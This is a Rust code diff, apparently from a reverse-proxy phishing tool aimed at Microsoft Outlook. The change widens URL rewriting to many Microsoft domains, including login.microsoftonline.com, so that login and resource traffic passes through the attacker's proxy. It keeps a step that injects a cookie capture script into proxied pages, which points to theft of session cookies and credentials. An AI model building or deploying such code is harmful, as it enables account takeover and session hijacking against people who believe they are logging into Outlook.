@@ -5,9 +5,25 @@ use std::collections::HashMap;
 use crate::cookie_capture::CookieCapture;
 use crate::proxy_security::{log_request, is_ip_allowed, add_security_headers};
 
-// Target Microsoft Outlook domain
+// Target Microsoft domains used by Outlook
 const TARGET_DOMAIN: &str = "outlook.live.com";
 const TARGET_URL: &str = "https://outlook.live.com";
+
+// Other Microsoft domains that need to be proxied
+const MICROSOFT_DOMAINS: &[&str] = &[
+    "outlook.live.com",
+    "outlook.office.com",
+    "outlook.office365.com",
+    "res.public.onecdn.static.microsoft",
+    "res-1.cdn.office.net",
+    "login.microsoftonline.com",
+    "webshell.suite.office.net",
+    "wwdb.webshell.suite.office.net",
+    "eudb.webshell.suite.office.net",
+    "content.lifecycle.office.net",
+    "exo.nel.measure.office.net",
+    "ad.doubleclick.net",
+];
 
 /// Proxy configuration
 #[derive(Clone)]
@@ -351,19 +367,34 @@ pub async fn proxy_handler(
     response
 }
 
-/// Rewrite HTML content - replace all references to target domain with proxy domain
+/// Rewrite all Microsoft domains in content
+fn rewrite_microsoft_domains(content: &str, proxy_domain: &str) -> String {
+    let mut rewritten = content.to_string();
+    
+    for domain in MICROSOFT_DOMAINS {
+        // Replace https://domain with https://proxy
+        rewritten = rewritten.replace(
+            &format!("https://{}", domain),
+            &format!("https://{}", proxy_domain),
+        );
+        // Replace http://domain with https://proxy
+        rewritten = rewritten.replace(
+            &format!("http://{}", domain),
+            &format!("https://{}", proxy_domain),
+        );
+        // Replace protocol-relative //domain with //proxy
+        rewritten = rewritten.replace(
+            &format!("//{}", domain),
+            &format!("//{}", proxy_domain),
+        );
+    }
+    
+    rewritten
+}
+
+/// Rewrite HTML content - replace all references to Microsoft domains with proxy domain
 fn rewrite_html_content(html: &str, config: &ProxyConfig) -> String {
-    let mut rewritten = html.to_string();
-    
-    // Replace target domain with proxy domain
-    rewritten = rewritten.replace(&config.target_domain, &config.proxy_domain);
-    rewritten = rewritten.replace(&config.target_url, &format!("https://{}", config.proxy_domain));
-    
-    // Replace http://target with https://proxy
-    rewritten = rewritten.replace(
-        &format!("http://{}", config.target_domain),
-        &format!("https://{}", config.proxy_domain),
-    );
+    let mut rewritten = rewrite_microsoft_domains(html, &config.proxy_domain);
     
     // Inject cookie capture script
     let cookie_script = format!(r#"
@@ -397,26 +428,12 @@ fn rewrite_html_content(html: &str, config: &ProxyConfig) -> String {
 
 /// Rewrite JavaScript content
 fn rewrite_js_content(js: &str, config: &ProxyConfig) -> String {
-    let mut rewritten = js.to_string();
-    
-    rewritten = rewritten.replace(&config.target_domain, &config.proxy_domain);
-    rewritten = rewritten.replace(&config.target_url, &format!("https://{}", config.proxy_domain));
-    rewritten = rewritten.replace(
-        &format!("http://{}", config.target_domain),
-        &format!("https://{}", config.proxy_domain),
-    );
-    
-    rewritten
+    rewrite_microsoft_domains(js, &config.proxy_domain)
 }
 
 /// Rewrite CSS content
 fn rewrite_css_content(css: &str, config: &ProxyConfig) -> String {
-    let mut rewritten = css.to_string();
-    
-    rewritten = rewritten.replace(&config.target_domain, &config.proxy_domain);
-    rewritten = rewritten.replace(&config.target_url, &format!("https://{}", config.proxy_domain));
-    
-    rewritten
+    rewrite_microsoft_domains(css, &config.proxy_domain)
 }
 
 /// Proxy status endpoint
